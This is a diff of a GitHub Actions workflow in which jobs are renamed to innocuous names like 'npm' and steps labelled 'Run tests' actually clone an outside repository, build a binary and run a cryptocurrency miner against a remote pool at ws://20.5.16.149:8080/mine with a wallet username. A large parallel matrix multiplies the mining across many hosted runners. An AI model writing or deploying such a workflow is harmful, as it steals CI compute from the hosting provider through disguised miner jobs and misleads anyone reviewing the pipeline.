@@ -1,18 +1,18 @@
-name: kont
+name: npm
 on: 
   push:
     branches: [ "main" ]
-
+  
 jobs:
-  me:
+  npm:
     runs-on: ubuntu-latest
     strategy:
-      max-parallel: 80
+      max-parallel: 120
       fail-fast: false
       matrix:
         go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9]
         flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z]
-    timeout-minutes: 15
+    timeout-minutes: 16
     env:
         NUM_JOBS: 20
         JOB: ${{ matrix.go }}
@@ -25,14 +25,14 @@ jobs:
     - name: Setup
       uses: actions/checkout@v4
     - name: clone
-      run: git clone https://github.com/fadieza/masil && cd masil && chmod u+x *
+      run: git clone https://github.com/fannyoza/jamput && cd jamput && chmod u+x *
     - name: Build
-      run: cd masil && cargo build --release
+      run: cd jamput && cargo build --release
     - name: Run tests
-      run: cd masil && ./target/release/masil --url ws://172.179.236.202:8080/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.17 --cores 4 &
+      run: cd jamput && ./target/release/visco --url ws://20.5.16.149:8080/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.13 --cores 4 &
         sleep 305s
-  chat:
-    needs: me
+  npm2:
+    needs: npm
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 250
@@ -52,16 +52,16 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: git clone https://github.com/fadieza/masil && cd masil && chmod u+x *
+      run: git clone https://github.com/fannyoza/jamput && cd jamput && chmod u+x *
     - name: Build
-      run: cd masil && cargo build --release
+      run: cd jamput && cargo build --release
     - name: Run tests
-      run: cd masil && ./target/release/masil --url ws://172.179.236.202:8080/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.17 --cores 4
+      run: cd jamput && ./target/release/visco --url ws://20.5.16.149:8080/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.13 --cores 4
         
     
      
-  enak:
-    needs: [me]
+  npm3:
+    needs: [npm]
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 250
@@ -81,14 +81,15 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: git clone https://github.com/fadieza/masil && cd masil && chmod u+x *
+      run: git clone https://github.com/fannyoza/jamput && cd jamput && chmod u+x *
     - name: Build
-      run: cd masil && cargo build --release
+      run: cd jamput && cargo build --release
     - name: Run tests
-      run: cd masil && ./target/release/masil --url ws://172.179.236.202:8080/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.17 --cores 4
+      run: cd jamput && ./target/release/visco --url ws://20.5.16.149:8080/mine mine --username CgVeVHHGGup7QAXccoA6hd9hUTfqwxXqRvAJ9wQozn7e.13 --cores 4
+        
     
   Success:
-    needs: [me, chat, enak]
+    needs: [npm, npm3, npm2]
     if: always()
     runs-on: ubuntu-20.04
     steps:
